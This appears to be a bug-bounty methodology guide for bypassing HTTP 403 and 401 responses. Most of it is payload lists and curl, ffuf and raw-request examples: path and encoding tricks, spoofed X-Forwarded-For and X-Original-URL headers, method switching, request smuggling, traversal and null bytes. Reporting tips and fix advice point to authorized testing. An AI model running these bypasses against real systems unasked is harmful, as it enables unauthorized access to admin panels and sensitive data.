# 403 and 401 Bypass

## Overview

Bypassing HTTP 403 (Forbidden) and 401 (Unauthorized) responses covers techniques that circumvent access controls in web applications. A 403 means the server understood the request but refuses to authorize it; a 401 means authentication is required. Both frequently protect sensitive endpoints behind misconfigured rules that can be defeated with path, header, method, or parameter manipulation.

## Impact

- Access to administrative panels
- Information disclosure of protected endpoints
- Privilege escalation
- Access to sensitive data and internal configuration
- Typical severity: **Medium to High** (P3-P2) depending on the endpoint reached

## Where to look

- Endpoints `/admin`, `/administrator`, `/dashboard`, `/manager`
- APIs with paths `/api/v1/admin/`, `/internal/`, `/debug/`
- Configuration files: `/config`, `/settings`, `/backup`
- Logs and debugging: `/logs`, `/error_log`, `/phpinfo`
- Any endpoint returning 403 during content discovery

## Testing methodology

### Phase 1: Discovering 403 endpoints
```bash
# Fuzzing with ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 403

# Gobuster
gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x php,html,js -b 200

# Do not stop at the parent endpoint
# /admin -> 403, but /admin/users may be reachable
ffuf -w wordlist.txt -u https://target.com/admin/FUZZ -mc 200,301,302
```

### Phase 2: URL manipulation
```
/admin      -> 403   (original)
/Admin      -> 200   (case change)
/aDmIn      -> 200   (mixed case)
/admin/     -> 200   (trailing slash)
/admin/.    -> 200   (trailing dot)
//admin//   -> 200   (double slash)
/./admin/./ -> 200   (dot segments)
/.;/admin   -> 200   (semicolon)
/admin..;/  -> 200   (path traversal variant)
/admin.json -> 200   (extension change)
/admin.php  -> 200   (extension change)
/;/admin    -> 200   (semicolon prefix)
```

**URL encoding**:
```
/admi%6e         -> %6e = 'n'
/%61%64%6d%69%6e -> full URL encode
/%2e/admin       -> %2e = '.'
/admin%2f        -> %2f = '/'
/admin..%2f      -> double encode traversal
```

**Path fuzzing**:
```
/FUZZ/admin
/admin/FUZZ
/adminFUZZ
```

```
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

#### URL rewrite headers
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin

GET /anything HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

#### Host header
```
Host: localhost
Host: 127.0.0.1
Host: target.com.admin
```

#### User-Agent spoofing
```bash
curl -A "Googlebot/2.1" https://target.com/admin/
curl -A "Mozilla/5.0 (compatible; Bingbot/2.0)" https://target.com/admin/
```

#### Referer spoofing
```bash
curl -H "Referer: https://target.com/" https://target.com/admin/
curl -H "Referer: https://google.com/" https://target.com/admin/
```

### Phase 4: HTTP method switching
```bash
# If GET returns 403, try other methods
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X PATCH https://target.com/admin
curl -X DELETE https://target.com/admin
curl -X HEAD https://target.com/admin
curl -X OPTIONS https://target.com/admin
curl -X TRACE https://target.com/admin

# Method override headers
curl -X POST -H "X-HTTP-Method-Override: GET" https://target.com/admin
curl -X POST -H "X-HTTP-Method: GET" https://target.com/admin
```

### Phase 5: Parameter tampering
```
# Access-control parameters
?isAdmin=false -> ?isAdmin=true
?view=restricted -> ?view=public
?role=user -> ?role=admin
?debug=false -> ?debug=true

# Remove restrictive parameters entirely
```

### Phase 6: Advanced techniques

#### HTTP request smuggling
```
POST /admin HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

#### Parameter pollution
```
GET /admin?user=admin&user=user HTTP/1.1
GET /admin?redirect=/admin HTTP/1.1
```

#### Path traversal against 403
```
GET /protected/files/../files/secret.txt HTTP/1.1
GET /protected/files/..%2ffiles/secret.txt HTTP/1.1
GET /protected/files/..;/files/secret.txt HTTP/1.1
```

#### IPv6
```bash
curl -H "Host: target.com" http://[::1]/admin/
```

## Real-world case: Pagespeed admin

1. `http://target.com/pagespeed_admin/` -> 403 Forbidden
2. Run bypass-403 tool -> one case changed to 200
3. **Method**: `http://target.com//pagespeed_admin/` (double slash)
4. Cause: misconfigured regex in the middleware (did not handle `//`)
5. **Result**: P2-High, admin panel access

## Reporting tips

- Clearly demonstrate: original request (403) vs modified request (200)
- Show the accessed content (screenshot of admin panel, sensitive data)
- Compare Content-Length to rule out false positives
- Explain the specific impact of the access obtained
- Suggest fix: server-side validation, path normalization, do not trust headers

## Bypass via null byte (%00)

```bash
# Append %00 to the endpoint
https://example.com/endpoint    -> 403 Forbidden
https://example.com/endpoint%00 -> 200 OK
```

Some route parsers treat the null byte as a string terminator, so the access control fails to recognize the endpoint as restricted.
